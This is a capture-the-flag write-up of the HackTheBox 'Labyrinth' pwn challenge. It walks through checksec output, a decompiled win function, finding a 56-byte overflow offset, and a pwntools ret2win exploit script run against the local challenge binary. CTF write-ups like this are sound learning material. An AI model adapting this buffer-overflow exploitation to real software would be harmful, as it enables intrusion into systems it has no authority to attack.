# Labyrinth

We first check the binary provided, to see what is the type of binary and what security is enabled:

```
❯ file labyrinth 
labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped

❯ checksec --file labyrinth 
[*] '/home/rin/ctf/ctf-writeups/HackTheBox/cyberapocalypse2023/pwn/challenge/labyrinth'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

The binary is dynamically linked to the supplied library and there is no PIE.

We run the binary and are prompted to choose a door between `01` and `160`.

Using `gdb` we see that `69` is the expected number for the first door (simple 'strncmp').

The program then asks us if we want to change our door. By fuzzing the input, we manage to get a segmentation error.

Disassembling the binary, we see the function `escape_plan`. Below is the function decompiled in Ghidra.

```c
void escape_plan(void)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  putchar(10);
  fwrite(&DAT_00402018,1,0x1f0,stdout);
  fprintf(stdout,
          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey : %s\n"
          ,&DAT_0040220e,&DAT_00402209);
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  return;
}
```

We see that the function opens the file `flag.txt` and prints its contents.
So the goal is to get our program to execute the function to print the flag. This technique is also known as ret2win.

We see that the function is located at address `0x00000000401255`:

```
pwndbg> info func escape
All functions matching regular expression "escape":

Non-debugging symbols:
0x0000000000401255  escape_plan
```

Thanks to our buffer overflow, we can override `rip` to redirect the execution flow, since we now know we can write to the stack.

Let's create a pattern:
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

We need to find the 8 bytes that overrides `rip`.
We find them in our pattern at offset 56 after padding with 56 bytes.

Now we just need to jump to the `escape_plan` function.
I wrote a simple exploit script to do this:

```python
from pwn import *

context.log_level = 'debug'

io = process("./labyrinth")

core = gdb.corefile(io)

ret2win = p64(0x401255)

print(io.recv().decode())
io.sendline(b'69')

ret = p64(0x4013ad)
payload = b"A"*56 + ret + ret2win
print(io.recv().decode())
io.sendline(payload)

# Get our flag
flag = io.recv().decode() 
print(flag)
```

Note: The `ret` added to the script is for stack alignment.
You may need to run the exploit several times for it to work.

```
Congratulations on escaping! Here is a sacred spell to help you continue your journey: 
HTB{f4k3_fl4g_4_t35t1ng}
```
